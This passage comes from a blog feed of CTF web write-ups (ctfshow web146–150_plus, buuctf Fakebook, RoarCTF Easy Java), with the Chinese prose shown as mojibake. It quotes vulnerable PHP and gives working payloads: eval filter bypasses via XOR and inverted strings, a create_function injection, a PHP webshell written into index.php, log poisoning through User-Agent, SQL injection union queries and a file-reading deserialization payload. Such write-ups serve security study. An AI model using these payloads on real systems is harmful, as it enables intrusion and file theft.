class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å€Ÿç”¨ä¸‰ç›®è¿ç®—ç¬¦å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?v1=1&amp;v3=?(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5):&amp;v2=1</span><br></pre></td></tr></table></figure><h3 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ç­‰å·å’Œä½è¿ç®—ç¬¦</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?v1=1&amp;v3===(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)||&amp;v2=1</span><br></pre></td></tr></table></figure><h3 id="web147"><a href="#web147" class="headerlink" title="web147"></a>web147</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line">        <span class="variable">$ctfshow</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‚è€ƒè¿™ç¯‡<a href="https://paper.seebug.org/755/">åšæ–‡</a>ç»•è¿‡æ­£åˆ™</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getï¼š</span><br><span class="line">/?show=echo 1;&#125;system(&#x27;tac flag.php&#x27;);//</span><br><span class="line">postï¼š</span><br><span class="line">ctf=\create_function</span><br></pre></td></tr></table></figure><h3 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_\%\\|\~\&#x27;\,\.\:\@\&amp;\*\+\- ]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_ctfshow_fl0g</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ²¡æœ‰è¿‡æ»¤å¼‚æˆ–</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?code=(&quot;%08%02%08%09%05%0d&quot;^&quot;%7b%7b%7b%7d%60%60&quot;)(&quot;%09%01%03%01%06%02&quot;^&quot;%7d%60%60%21%60%28&quot;);</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ä½¿ç”¨ä¸­æ–‡å˜é‡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?code=$å“ˆ=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$å“ˆ&#125;[å“¼]($&#123;$å“ˆ&#125;[å—¯]);&amp;å“¼=system&amp;å—¯=tac f*</span><br><span class="line">&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;; å¼‚æˆ–å‡ºæ¥çš„ç»“æœæ˜¯ _GET</span><br></pre></td></tr></table></figure><h3 id="web149"><a href="#web149" class="headerlink" title="web149"></a>web149</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç›´æ¥å¾€<code>index.php</code>é‡Œé¢å†™ğŸï¼Œå¦‚æœæ˜¯åˆ«çš„æ–‡ä»¶å°±è¦åˆ©ç”¨ç«äº‰</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GETï¼š</span><br><span class="line">/?ctf=index.php</span><br><span class="line">POSTï¼š</span><br><span class="line">1=system(&#x27;cat /ctfshow_fl0g_here.txt&#x27;);&amp;show=&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure><h3 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFSHOW</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$secret</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret = <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isVIP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;vip?<span class="literal">TRUE</span>:<span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$class</span>))&#123;</span><br><span class="line">            <span class="variable">$class</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#è¿‡æ»¤å­—ç¬¦</span></span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, <span class="variable">$key</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctf</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">class_exists</span>(<span class="variable">$__CTFSHOW__</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;class is exists!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$isVIP</span> &amp;&amp; <span class="title function_ invoke__">strrpos</span>(<span class="variable">$ctf</span>, <span class="string">&quot;:&quot;</span>)===<span class="literal">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$ctf</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ—¥å¿—åŒ…å«ï¼Œæ‰§è¡Œä¸¤æ¬¡å³å¯çœ‹åˆ°ç»“æœ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET:</span><br><span class="line">/?isVIP=1</span><br><span class="line">POST:</span><br><span class="line">ctf=/var/log/nginx/access.log</span><br><span class="line"></span><br><span class="line">User-Agent:&lt;?php system(&#x27;tac f*&#x27;);?&gt;</span><br></pre></td></tr></table></figure><h3 id="web150-plus"><a href="#web150-plus" class="headerlink" title="web150_plus"></a>web150_plus</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFSHOW</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$secret</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret = <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isVIP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;vip?<span class="literal">TRUE</span>:<span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$class</span>))&#123;</span><br><span class="line">            <span class="variable">$class</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#è¿‡æ»¤å­—ç¬¦</span></span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, <span class="variable">$key</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctf</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">class_exists</span>(<span class="variable">$__CTFSHOW__</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;class is exists!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$isVIP</span> &amp;&amp; <span class="title function_ invoke__">strrpos</span>(<span class="variable">$ctf</span>, <span class="string">&quot;:&quot;</span>)===<span class="literal">FALSE</span> &amp;&amp; <span class="title function_ invoke__">strrpos</span>(<span class="variable">$ctf</span>,<span class="string">&quot;log&quot;</span>)===<span class="literal">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$ctf</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨çš„<code>..CTFSHOW..</code>ä¼šè¢«è§£ææˆ<code>__CTFSHOW__</code>ç„¶åè¿›è¡Œäº†å˜é‡è¦†ç›–ï¼Œå› ä¸ºCTFSHOWæ˜¯ç±»å°±ä¼šä½¿ç”¨__autoload()å‡½æ•°æ–¹æ³•å»åŠ è½½phpinfoï¼Œflagåœ¨phpinfoä¸­</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?..CTFSHOW..=phpinfo</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf Web åˆ·é¢˜è®°å½• 2</title>
      <link href="/2022/11/04/buuctf-web2/"/>
      <url>/2022/11/04/buuctf-web2/</url>
      
        <content type="html"><![CDATA[<h1 id="buuctf-Web-åˆ·é¢˜è®°å½•-2"><a href="#buuctf-Web-åˆ·é¢˜è®°å½•-2" class="headerlink" title="buuctf Web åˆ·é¢˜è®°å½• 2"></a>buuctf Web åˆ·é¢˜è®°å½• 2</h1><blockquote><p>å‚è€ƒï¼š</p><p><a href="https://blog.csdn.net/Manuffer/article/details/120738755">æ— å‚æ•°RCEæ€»ç»“</a></p><p><a href="http://www.pdsdt.lovepdsdt.com/index.php/2019/11/06/php_shell_no_code/">phpæ— å‚æ•°æ‰§è¡Œå‘½ä»¤</a></p><p><a href="https://blog.csdn.net/m0_47418965/article/details/121708917">æœ€å…¨phpmyadminæ¼æ´æ±‡æ€»</a></p></blockquote><h2 id="ç½‘é¼æ¯-2018-Fakebook"><a href="#ç½‘é¼æ¯-2018-Fakebook" class="headerlink" title="[ç½‘é¼æ¯ 2018]Fakebook"></a>[ç½‘é¼æ¯ 2018]Fakebook</h2><p>è®¿é—®<code>/robots.txt</code>å‘ç°å¤‡ä»½æ–‡ä»¶<code>/user.php.bak</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="variable language_">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>curl_init()ç”¨æ¥åˆå§‹åŒ–ä¸€ä¸ªcurlä¼šè¯ï¼Œcurlå¯ä»¥ä½¿ç”¨fileä¼ªåè®®è¯»å–æ–‡ä»¶ã€‚</p></blockquote><p>æ³¨å†Œç™»é™†åå‘ç°ç½‘é¡µ<code>/view.php?no=1</code>ï¼Œå­˜åœ¨<code>sqlæ³¨å…¥</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#ç‰ˆæœ¬ 10.2.26-MariaDB-log </span><br><span class="line">/view.php?no=-1 union/**/select 1,version(),3,4%23</span><br><span class="line">#æ•°æ®åº“ fakebook</span><br><span class="line">/view.php?no=-1 union/**/select 1,database(),3,4%23</span><br><span class="line">#è¡¨ users</span><br><span class="line">/view.php?no=-1 union/**/select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;fakebook&#x27;),3,4%23</span><br><span class="line">#åˆ— no,username,passwd,data</span><br><span class="line">/view.php?no=-1 union/**/select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3,4%23</span><br><span class="line">#å†…å®¹ O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;ADMIN&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:62:&quot;http://0534be32-4335-4133-968c-fefec0550a80.node4.buuoj.cn:81/&quot;;&#125; </span><br><span class="line">/view.php?no=-1 union/**/select 1,(select group_concat(data) from users),3,4%23</span><br></pre></td></tr></table></figure><p>å‘ç°æœ€åè¯»å‡ºçš„å†…å®¹æ˜¯åºåˆ—åŒ–åçš„æ•°æ®ï¼Œæƒ³åˆ°å‰é¢çš„<code>curl</code>å¯ä»¥ä½¿ç”¨<code>file</code>ä¼ªåè®®è¯»å–æ–‡ä»¶ï¼Œæ•…å°è¯•è¯»å–<code>flag</code>æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;evo1ution&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;<span class="comment">//æŠ¥é”™ä¸­å‡ºç° /var/www/html/view.phpï¼Œæ•…å¯çŸ¥flag.phpæ–‡ä»¶ä½ç½®</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">UserInfo</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¿®æ”¹åå¾—åˆ°<code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/view.php?no=-1 union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:9:&quot;evo1ution&quot;;s:3:&quot;age&quot;;i:10;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure><p>åœ¨é¡µé¢æºç çš„<code>iframe</code>è·å¾—base64ç¼–ç </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PD9waHANCg0KJGZsYWcgPSAiZmxhZ3s2NzYyOGIyOS05MTY3LTQ2MGItYTEzMi05YTZiNTY2ZTc1NjV9IjsNCmV4aXQoMCk7DQo=</span><br></pre></td></tr></table></figure><p>è§£ç å</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;67628b29-9167-460b-a132-9a6b566e7565&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p>ç‚¹å‡»<code>help</code>å‘ç°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://5ee09234-7e7f-446a-ad21-604cfd607d7f.node4.buuoj.cn:81/Download?filename=help.docx</span><br><span class="line">java.io.FileNotFoundException:&#123;help.docx&#125;</span><br></pre></td></tr></table></figure><p>ç”¨<code>post</code>ä¼ <code>filename=help.docx</code>ä¸‹è½½å¾—åˆ°<code>help.docx</code></p><p>![](D:&#x2F;MyBlog&#x2F;Blogs&#x2F;buuPics&#x2F;[RoarCTF 2019]Easy Java.png)</p><p>å°è¯•<code>filename=/WEB-INF/web.xml</code>å¾—åˆ°</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>Index<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>IndexController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.IndexController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span 